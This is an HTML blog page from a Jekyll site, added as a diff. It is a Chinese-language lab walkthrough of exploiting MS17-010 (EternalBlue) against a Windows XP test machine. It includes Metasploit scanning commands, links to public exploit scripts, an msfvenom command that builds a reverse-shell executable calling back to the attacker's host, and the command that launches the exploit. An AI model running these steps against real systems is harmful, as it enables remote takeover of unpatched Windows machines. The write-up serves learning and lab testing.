@@ -1,0 +1,497 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>MS17-010 - 永恒之蓝 - Yueyejian’s Blog</title>
+<meta name="description" content="MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="MS17-010 - 永恒之蓝">
+<meta property="og:url" content="http://localhost:4000/vul/ms17-010/">
+
+
+  <meta property="og:description" content="MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-04-20T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/vul/ms17-010/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="MS17-010 - 永恒之蓝">
+    <meta itemprop="description" content="MS17-010 - 永恒之蓝0x00 漏洞概述Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。">
+    <meta itemprop="datePublished" content="2022-04-20T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">MS17-010 - 永恒之蓝
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-04-20T00:00:00+08:00">April 20, 2022</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</a><ul><li><a href="#0x00-漏洞概述">0x00 漏洞概述</a></li><li><a href="#0x01-影响版本">0x01 影响版本</a></li><li><a href="#0x02-环境搭建">0x02 环境搭建</a></li><li><a href="#0x03-漏洞检测">0x03 漏洞检测</a></li><li><a href="#0x04-漏洞利用">0x04 漏洞利用</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+
+<h2 id="0x01-影响版本">0x01 影响版本</h2>
+<p>WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
+
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p>靶机winXP（关闭防火墙） 192.168.32.131</p>
+
+<p>攻击机kali   192.168.32.128</p>
+
+<h2 id="0x03-漏洞检测">0x03 漏洞检测</h2>
+<p>通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞</p>
+
+<p><img src="/images/vul/ms17-010/0.jpg" alt="" /></p>
+
+<p>打开msf，搜索ms17-010</p>
+
+<p><img src="/images/vul/ms17-010/1.jpg" alt="" /></p>
+
+<p>选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机</p>
+
+<p>用到的命令：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search ms17-101
+$ use 1
+$ show options
+$ set rhost 192.168.32.0/24
+$ run
+</code></pre></div></div>
+<p>结果显示靶机存在漏洞</p>
+
+<p><img src="/images/vul/ms17-010/2.jpg" alt="" /></p>
+
+<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
+<p>但是kali自带的永恒之蓝攻击模块是针对64位系统的，而我的靶机如上图所见是32位的。然后我就自闭了，试了msf上面不同的攻击模块和不同的payload，还是获取不到shell，也参考了网上其他大佬的文章，但是看不太懂。。最后去外网搜参考了一位外国友人的文章，碰巧的是他遇到的问题和我的一模一样，于是按照这个方法成功获得了shell。</p>
+
+<p><a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3">Exploiting-ms17-010-without-metasploit-win-xp-sp3</a></p>
+
+<p>首先先下载好下面这个exploit，在这个脚本的描述里，以下windows版本都适用</p>
+
+<p>https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tested on:
+- Windows 2016 x64
+- Windows 10 Pro Build 10240 x64
+- Windows 2012 R2 x64
+- Windows 8.1 x64
+- Windows 2008 R2 SP1 x64
+- Windows 7 SP1 x64
+- Windows 2008 SP1 x64
+- Windows 2003 R2 SP2 x64
+- Windows XP SP2 x64
+- Windows 8.1 x86
+- Windows 7 SP1 x86
+- Windows 2008 SP1 x86
+- Windows 2003 SP2 x86
+- Windows XP SP3 x86
+- Windows 2000 SP4 x86
+</code></pre></div></div>
+
+<p>然后用msf生成一个用来弹shell的可执行程序</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.32.128 LPORT=2333 -f exe -a x86 --platform windows -o ms17-010.exe
+</code></pre></div></div>
+
+<p>最后还需要一个mysmb.py ，不然会报错</p>
+
+<p>https://github.com/worawit/MS17-010/blob/master/mysmb.py</p>
+
+<p>把这三样东西放在kali中的同一个目录，提前监听2333端口，执行以下命令就可以了</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python send_and_execute.py 192.168.32.131 ms17-010.exe
+
+</code></pre></div></div>
+
+<p><img src="/images/vul/ms17-010/3.jpg" alt="" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#msf" class="page__taxonomy-item" rel="tag">msf</a><span class="sep">, </span>
+    
+      <a href="/tags/#smb" class="page__taxonomy-item" rel="tag">smb</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#vul" class="page__taxonomy-item" rel="tag">vul</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-04-20T00:00:00+08:00">April 20, 2022</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/vulhub/CVE-2016-4437/" class="pagination--pager" title="CVE-2016-4437 - Shiro反序列化
+">Previous</a>
+    
+    
+      <a href="/vul/CVE-2017-7921/" class="pagination--pager" title="CVE-2017-7921 - Hikvision摄像头越权访问
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
